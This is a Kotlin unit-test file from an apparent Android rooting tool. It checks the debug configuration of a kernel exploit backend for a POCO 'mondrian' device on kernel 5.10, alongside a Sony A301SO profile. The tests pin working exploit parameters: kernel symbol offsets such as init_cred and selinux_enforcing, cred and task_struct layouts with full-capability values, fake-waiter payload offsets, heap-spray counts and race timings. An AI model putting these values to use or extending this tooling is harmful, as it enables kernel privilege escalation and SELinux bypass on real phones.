package com.ghostlock.app.backend.backends.cve43499.config

import com.ghostlock.app.backend.backends.cve43499.generator.Cve43499GeneratorContext
import com.ghostlock.app.backend.backends.cve43499.generator.Cve43499PselectInputGenerator
import com.ghostlock.app.backend.backends.cve43499.generator.Cve43499RouteGeneratorFactory
import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.jni.Native43499PselectSpec
import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499WriteChainPolicy
import java.io.File
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test

/**
 * mondrian 5.10 debug 配置 + 设备选择 + legacy floor 几何单测（task-58）。
 *
 * 覆盖：
 * - `debug-mondrian.conf` 关键字段回归（release/route/offset/task_struct/cred/
 *   kernelsnitch/generator payload/multicast/injection/perf）；
 * - 设备选择（A301SO 不变 / mondrian 新增 / 未知与歧义 fail-closed）+ release 对拍；
 * - 设备相关执行参数派生（mm 960 ⇒ floor 34）与 A301SO（1024 ⇒ 32）数值不变；
 * - RequestFactory 按 floor 语义构造 placement（960 非整除用例 + A301SO 对照向量）。
 *
 * @note 纯 JVM；不触 Android/JNI/真机。
 */
class MondrianDebugConfigTest {

    @Test
    fun `parses mondrian profile fields from device full conf`() {
        val debug = Cve43499DebugConfig.parse(readAsset(MONDRIAN_ASSET))
        assertEquals("5.10.252-gki-gabcbe4b2bc10", debug.release)
        assertEquals(5, debug.kernelMajor)
        assertEquals(0xffffff8000000000uL.toLong(), debug.generator.addressModel.directMapBase)
        assertEquals(0xA8000000L, debug.generator.addressModel.kernelPhysLoad)
        assertEquals(0x80000000L, debug.generator.addressModel.kernelPhysOffset)
        /* route.multicast_waiter：full.conf 5 个消费字段。 */
        assertEquals(96, debug.route.waiterOff)
        assertEquals(264, debug.route.bufferSize)
        assertEquals(48, debug.route.taskOffset)
        assertEquals(56, debug.route.lockOffset)
        assertEquals(1, debug.route.compactWaiter)
        /* offset 10 字段（full.conf 直接值）。 */
        assertEquals(40_542_656L, debug.offsets.initTask)
        assertEquals(40_365_808L, debug.offsets.initCred)
        assertEquals(41_488_384L, debug.offsets.emptyZeroPage)
        assertEquals(41_507_584L, debug.offsets.rootTaskGroup)
        assertEquals(41_846_440L, debug.offsets.selinuxEnforcing)
        assertEquals(35_153_680L, debug.offsets.selinuxBlobSizes)
        assertEquals(35_153_704L, debug.offsets.securityHookHeads)
        assertEquals(39_389_696L, debug.offsets.slideNfulnlLogger)
        assertEquals(41_959_753L, debug.offsets.slideBootId)
        assertEquals(39_389_472L, debug.offsets.slideLoggers01)
        /* task_struct 5.10 值。 */
        assertEquals(132, debug.taskStruct.prio)
        assertEquals(140, debug.taskStruct.normalPrio)
        assertEquals(784L, debug.taskStruct.schedTaskGroup)
        assertEquals(2156L, debug.taskStruct.piLock)
        assertEquals(2176L, debug.taskStruct.piWaiters)
        assertEquals(2192L, debug.taskStruct.piTopTask)
        assertEquals(2200L, debug.taskStruct.piBlockedOn)
        assertEquals(1480L, debug.taskStruct.pid)
        assertEquals(1484L, debug.taskStruct.tgid)
        assertEquals(1424L, debug.taskStruct.atomicFlags)
        assertEquals(1912L, debug.taskStruct.realCred)
        assertEquals(1920L, debug.taskStruct.cred)
        assertEquals(1936L, debug.taskStruct.comm)
        assertEquals(1224L, debug.taskStruct.tasks)
        assertEquals(2120L, debug.taskStruct.seccomp)
        /* task-133/S2：5.10 cred_jar=168；cred 布局 168/40/5/usage@0。 */
        assertEquals(40L, debug.cred.capsOffset)
        assertEquals(168L, debug.cred.copySize)
        assertEquals(0L, debug.cred.usageOffset)
        assertEquals(256L, debug.cred.usageValue)
        assertEquals(5, debug.cred.capsCount)
        assertEquals(2_199_023_255_551L, debug.cred.capsValue)
        assertEquals(128L, debug.cred.ref0Offset)
        assertEquals(136L, debug.cred.ref1Offset)
        assertEquals(144L, debug.cred.ref2Offset)
        assertEquals(3L, debug.cred.refCount)
        assertEquals(null, debug.cred.ref3Offset)
        assertEquals(-274_704_174_840L, debug.cred.ref0Image)
        assertEquals(-274_702_745_712L, debug.cred.ref1Image)
        assertEquals(-274_704_174_848L, debug.cred.ref2Image)
        assertEquals(null, debug.cred.ref3Image)
        /* kernelsnitch 960（E0/full.conf）。 */
        assertEquals(8, debug.kernelsnitch.collisions)
        assertEquals(960L, debug.kernelsnitch.mmStructSz)
        /* generator：legacy2 5.10 常量。 */
        assertEquals(3712L, debug.generator.payload.lockOff)
        assertEquals(4480L, debug.generator.payload.w0Off)
        assertEquals(4672L, debug.generator.payload.rightOff)
        assertEquals(4704L, debug.generator.payload.leftOff)
        assertEquals(4736L, debug.generator.payload.fakeTaskOff)
        assertEquals(-3712L, debug.generator.payload.skbDataDelta)
        assertEquals(64L, debug.generator.payload.fakeTaskUsageOff)
        assertEquals(120L, debug.generator.payload.fakeTaskPrio)
        assertEquals(140L, debug.generator.payload.fakeWaiterPrio)
        assertEquals(256L, debug.generator.payload.writeValueOffset)
        assertEquals(16L, debug.generator.payload.pageAcceptBit)
        assertEquals(264L, debug.generator.multicast.frameSize)
        assertEquals(8L, debug.generator.multicast.familyOffset)
        assertEquals(0, debug.generator.multicast.stampFamily)
        assertEquals(1, debug.generator.multicast.disarmRequired)
        assertEquals(0x80000000uL.toLong(), debug.generator.multicast.futexWaiterFlag)
        /* pselect 5.10 路线参数（S2）。 */
        assertEquals(320L, debug.generator.pselect.nfds)
        assertEquals(320L, debug.generator.pselect.maxNfds)
        assertEquals(4L, debug.generator.pselect.operationBudget)
        assertEquals(800_000_000L, debug.generator.pselect.timeoutNanos)
        assertEquals(5_000_000L, debug.generator.pselect.enterDelayNs)
        assertEquals(64L, debug.generator.pselect.fdReserveStride)
        assertEquals(-2L, debug.generator.pselect.waiterShift)
        assertEquals(0L, debug.generator.pselect.selectUseTimeval)
        assertEquals(1, debug.generator.payload.compactWaiter)
        val anchor = requireNotNull(debug.generator.selectStackAnchor)
        assertEquals(1, anchor.compactWaiter)
        assertEquals(0x27dc7c8L, anchor.lockAnchorImage)
        assertEquals(4096L, anchor.lockAnchorBytes)
        assertEquals(32L, anchor.lockAnchorStride)
        val race = requireNotNull(debug.race)
        assertEquals(30L, race.parkTimeoutMs)
        assertEquals(300_000L, race.routeDoneTimeoutMs)
        assertEquals(10_000L, race.setupSettleUs)
        /* 注入选择：pselect + 默认 process victim；perf 保持默认关闭。 */
        assertEquals(DebugPrimitiveKind.PSELECT, debug.injection.primitive)
        assertEquals(DebugVictimTransport.PROCESS, debug.injection.victim)
        assertNotNull(debug.perf)
        assertEquals(0, debug.perf!!.enabled)
        assertEquals(262145L, debug.perf!!.attrSampleType)
    }

    @Test
    fun `device selection keeps a301so and adds mondrian with fail closed unknown`() {
        assertEquals(
            Cve43499DebugConfig.ASSET_PATH,
            Cve43499DebugConfig.selectAssetPath(
                identity(device = "A301SO", release = "5.15.189-android13-8-00016-g51bba4309aac-ab14546557"),
            ),
        )
        assertEquals(
            Cve43499DebugConfig.ASSET_PATH,
            Cve43499DebugConfig.selectAssetPath(
                identity(device = "", fingerprint = "SONY/A301SO/A301SO:15/x", release = ""),
            ),
        )
        assertEquals(
            Cve43499DebugConfig.ASSET_PATH_MONDRIAN,
            Cve43499DebugConfig.selectAssetPath(
                identity(device = "mondrian", model = "23013RK75C", release = "5.10.252-gki-gabcbe4b2bc10"),
            ),
        )
        assertEquals(
            Cve43499DebugConfig.ASSET_PATH_MONDRIAN,
            Cve43499DebugConfig.selectAssetPath(
                identity(
                    device = "",
                    fingerprint = "POCO/mondrian_global/mondrian:15/AQ3A/x",
                    release = "",
                ),
            ),
        )
        assertEquals(
            Cve43499DebugConfig.ASSET_PATH_MONDRIAN,
            Cve43499DebugConfig.selectAssetPath(
                identity(device = "", model = "", release = "5.10.252-gki-gabcbe4b2bc10"),
            ),
        )
        expectFailure("debug-config-device-unsupported") {
            Cve43499DebugConfig.selectAssetPath(
                identity(device = "emu64a", model = "sdk_gphone64", release = "6.1.0"),
            )
        }
        expectFailure("debug-config-device-ambiguous") {
            Cve43499DebugConfig.selectAssetPath(
                identity(
                    device = "a301so",
                    release = "5.10.252-gki-gabcbe4b2bc10",
                ),
            )
        }
    }

    @Test
    fun `release verification fails closed on mismatch`() {
        Cve43499DebugConfig.verifyKernelRelease(
            "5.10.252-gki-gabcbe4b2bc10",
            "5.10.252-gki-gabcbe4b2bc10",
        )
        Cve43499DebugConfig.verifyKernelRelease("5.10.252-gki-gabcbe4b2bc10", "")
        expectFailure("debug-config-release-mismatch") {
            Cve43499DebugConfig.verifyKernelRelease(
                "5.10.252-gki-gabcbe4b2bc10",
                "5.15.189-android13-8-00016-g51bba4309aac-ab14546557",
            )
        }
    }

    @Test
    fun `device aware execution parameters use legacy floor objects`() {
        val mondrian = Cve43499DebugConfig.parse(readAsset(MONDRIAN_ASSET))
        val execution = Cve43499DebugConfig.executionParameters(mondrian)
        assertEquals(960L, execution.mmStructSize)
        assertEquals(8L, execution.snitchCollisions)
        assertEquals(32768L, execution.allocationSize)
        assertEquals(34, execution.objectsPerSlab)
        assertEquals(34L * 8, execution.prepareObjectCount.toLong())
        assertEquals(34L * 6, execution.sprayObjectCount.toLong())
        assertEquals(33, execution.preObjectCount)
        assertEquals(34, execution.postObjectCount)
        assertTrue(execution.maxObjectsPerSlab >= 34L)
        /* legacy 对照向量：34*960=32640 ≤32768 <35*960=33600（floor 语义）。 */
        assertEquals(34, Cve43499DebugConfig.placementObjects(32768L, 960L))
        assertEquals(32, Cve43499DebugConfig.placementObjects(32768L, 1024L))
        assertEquals(null, Cve43499DebugConfig.placementObjects(32768L, 0L))
        assertEquals(null, Cve43499DebugConfig.placementObjects(960L, 1024L))

        /* A301SO 数值不变：1024 整除 ⇒ 32/256/192/31/32（与旧硬编码一致）。 */
        val a301so = Cve43499DebugConfig.parse(readAsset(A301SO_ASSET))
        val old = Cve43499DebugConfig.executionParameters(a301so)
        assertEquals(1024L, old.mmStructSize)
        assertEquals(32, old.objectsPerSlab)
        assertEquals(256, old.prepareObjectCount)
        assertEquals(192, old.sprayObjectCount)
        assertEquals(31, old.preObjectCount)
        assertEquals(32, old.postObjectCount)
        assertEquals(32L, old.maxObjectsPerSlab)
    }

    @Test
    fun `placement objects floor boundaries and invalid mm fail closed`() {
        /* legacy floor 边界：非整除 floor、精确整除、mm>allocation、0/负值、
         * 结果超出 Kotlin Int（fail-closed；Native 助手允许到 UINT32_MAX，
         * debug 配置值远小于两者，不构成分歧）。 */
        assertEquals(34, Cve43499DebugConfig.placementObjects(32_768L, 960L))
        assertEquals(32, Cve43499DebugConfig.placementObjects(32_768L, 1_024L))
        assertEquals(31, Cve43499DebugConfig.placementObjects(32_768L, 1_025L))
        assertEquals(1, Cve43499DebugConfig.placementObjects(960L, 960L))
        assertEquals(null, Cve43499DebugConfig.placementObjects(959L, 960L))
        assertEquals(null, Cve43499DebugConfig.placementObjects(0L, 960L))
        assertEquals(null, Cve43499DebugConfig.placementObjects(32_768L, 0L))
        assertEquals(null, Cve43499DebugConfig.placementObjects(-1L, 960L))
        assertEquals(null, Cve43499DebugConfig.placementObjects(32_768L, -960L))
        assertEquals(null, Cve43499DebugConfig.placementObjects(Long.MAX_VALUE, 1L))
        /* mondrian 余数证据：34*960=32640 ≤ 32768 < 35*960=33600。 */
        assertEquals(128L, 32_768L - 34L * 960L)
        assertTrue(34L * 960L <= 32_768L)
        assertTrue(35L * 960L > 32_768L)

        /* 非法 mm_struct 在派生执行参数时具名 fail-closed。 */
        val mondrian = Cve43499DebugConfig.parse(readAsset(MONDRIAN_ASSET))
        expectFailure("debug-config-invalid:kernelsnitch.mm_struct_sz:0") {
            Cve43499DebugConfig.executionParameters(
                mondrian.copy(kernelsnitch = DebugKernelsnitch(collisions = 8, mmStructSz = 0L)),
            )
        }
        expectFailure("debug-config-invalid:kernelsnitch.mm_struct_sz:32769") {
            Cve43499DebugConfig.executionParameters(
                mondrian.copy(
                    kernelsnitch = DebugKernelsnitch(collisions = 8, mmStructSz = 32_769L),
                ),
            )
        }
        val execution = Cve43499DebugConfig.executionParameters(mondrian)
        assertEquals(34, execution.objectsPerSlab)
        assertEquals(34L * execution.prepareSlabs, execution.prepareObjectCount.toLong())
        assertEquals(34L * (1 + execution.mmPartials), execution.sprayObjectCount.toLong())
        assertEquals(34, execution.postObjectCount)
        assertEquals(34L, execution.maxObjectsPerSlab)
    }

    /** @return 测试用设备身份。 */
    private fun identity(
        device: String,
        model: String = "",
        fingerprint: String = "",
        release: String,
    ): Cve43499DebugConfig.DebugDeviceIdentity = Cve43499DebugConfig.DebugDeviceIdentity(
        device = device,
        model = model,
        fingerprint = fingerprint,
        kernelRelease = release,
    )

    /**
     * @param reasonPrefix 期望异常前缀。
     * @param block 触发块。
     */
    private fun expectFailure(reasonPrefix: String, block: () -> Unit) {
        try {
            block()
            fail("expected failure: $reasonPrefix")
        } catch (problem: Cve43499DebugConfigException) {
            assertTrue(
                "unexpected reason: ${problem.message}",
                problem.message?.startsWith(reasonPrefix) == true,
            )
        }
    }

    /**
     * @param asset 相对 debug assets 的路径尾段。
     * @return 文件文本。
     */
    private fun readAsset(asset: String): String {
        val relative = "app/src/debug/assets/$asset"
        val candidates = listOf(File(relative), File("../$relative"), File("../../$relative"))
        val file = candidates.firstOrNull { it.isFile }
            ?: error("debug asset not found: $asset from ${File(".").absolutePath}")
        return file.readText()
    }

    @Test
    fun `task-133 pselect fd stride below victim pipe floor fails closed`() {
        val source = readAsset(MONDRIAN_ASSET)
        val bad = source.replace("fd_reserve_stride = 64", "fd_reserve_stride = 63")
        expectFailure("debug-config-invalid:generator.pselect.fd_reserve_stride:63") {
            Cve43499DebugConfig.parse(bad)
        }
    }

    @Test
    fun `task-133 pselect requires compact waiter layout`() {
        val source = readAsset(MONDRIAN_ASSET)
        val bad = source.replace("compact_waiter = 1\n    fake_task_usage_off", "compact_waiter = 0\n    fake_task_usage_off")
        expectFailure("debug-config-invalid:generator.payload.compact_waiter:0") {
            Cve43499DebugConfig.parse(bad)
        }
    }

    @Test
    fun `task-134 pselect waiter lock word uses anchor image alias`() {
        val debug = Cve43499DebugConfig.parse(readAsset(MONDRIAN_ASSET))
        val execution = Cve43499DebugConfig.executionParameters(debug)
        val context = Cve43499GeneratorContext(debug, execution, 4242)
        val facts = Cve43499PlacementFacts(
            candidatePageBase = 0xffffff8800210000uL.toLong(),
            pageSize = 0x1000L,
            allocationSize = 0x8000L,
            requiredAlignment = 0x8000L,
            measuredObjectAddress = 0xffffff8800211234uL.toLong(),
            measurementRounds = 3L,
            retainedChildCount = 0L,
            retainedDescriptorCount = 0L,
        )
        val generated = Cve43499PselectInputGenerator(context).generate(facts)
        val spec = generated.primitive as Native43499PselectSpec
        val anchor = requireNotNull(debug.generator.selectStackAnchor)
        val expected = context.dataAlias(anchor.lockAnchorImage)
        val wordOffset = (debug.generator.pselect.waiterShift + 9L) * 8L
        assertEquals(expected, readU64(spec.frameBytes, wordOffset))
    }

    @Test
    fun `task-134 anchor partial and noncompact fail closed`() {
        val source = readAsset(MONDRIAN_ASSET)
        val partial = source.replace("    lock_anchor_bytes = 4096\n", "")
        expectFailure("debug-config-missing:route.select_stack.lock_anchor_*") {
            Cve43499DebugConfig.parse(partial)
        }
        val noncompact = source.replace(
            "    compact_waiter = 1\n    lock_anchor_image",
            "    compact_waiter = 0\n    lock_anchor_image",
        )
        expectFailure("debug-config-invalid:route.select_stack.compact_waiter:0") {
            Cve43499DebugConfig.parse(noncompact)
        }
    }

    /** @return 小端 u64（测试向量读回）。 */
    private fun readU64(bytes: ByteArray, offset: Long): Long {
        val at = offset.toInt()
        var value = 0L
        for (index in 0 until 8) {
            value = value or ((bytes[at + index].toLong() and 0xffL) shl (8 * index))
        }
        return value
    }

    @Test
    fun `task-135 execution race overrides actor timing only`() {
        val debug = Cve43499DebugConfig.parse(readAsset(MONDRIAN_ASSET))
        val execution = Cve43499DebugConfig.executionParameters(debug)
        assertEquals(30_000_000L, execution.parkedTimeoutNanos)
        assertEquals(300_000_000_000L, execution.executionTimeoutNanos)
        assertEquals(10_000L, execution.setupSettleUs)
        assertEquals(1L, execution.consumerMax)
        assertEquals(1L, execution.consumerBurst)
        assertEquals(5_000_000L, debug.generator.pselect.enterDelayNs)
    }

    @Test
    fun `task-135 execution race invalid windows fail closed`() {
        val source = readAsset(MONDRIAN_ASSET)
        expectFailure("debug-config-invalid:execution.race-window:30/30/10000") {
            Cve43499DebugConfig.parse(source.replace("route_done_timeout_ms = 300000", "route_done_timeout_ms = 30"))
        }
        expectFailure("debug-config-invalid:execution.race-window:30/300000/30000") {
            Cve43499DebugConfig.parse(source.replace("setup_settle_us = 10000", "setup_settle_us = 30000"))
        }
        expectFailure("debug-config-invalid:execution.race:0/300000/10000") {
            Cve43499DebugConfig.parse(source.replace("park_timeout_ms = 30", "park_timeout_ms = 0"))
        }
        val missing = source.replace("    setup_settle_us = 10000\n", "")
        expectFailure("debug-config-missing:execution.race.setup_settle_us") {
            Cve43499DebugConfig.parse(missing)
        }
    }

    private companion object {
        /** A301SO 5.15 debug 资产（既有行为对照）。 */
        const val A301SO_ASSET: String = "profile/43499/debug-a301so.conf"

        /** mondrian 5.10 debug 资产（本批新增）。 */
        const val MONDRIAN_ASSET: String = "profile/43499/debug-mondrian.conf"
    }
}
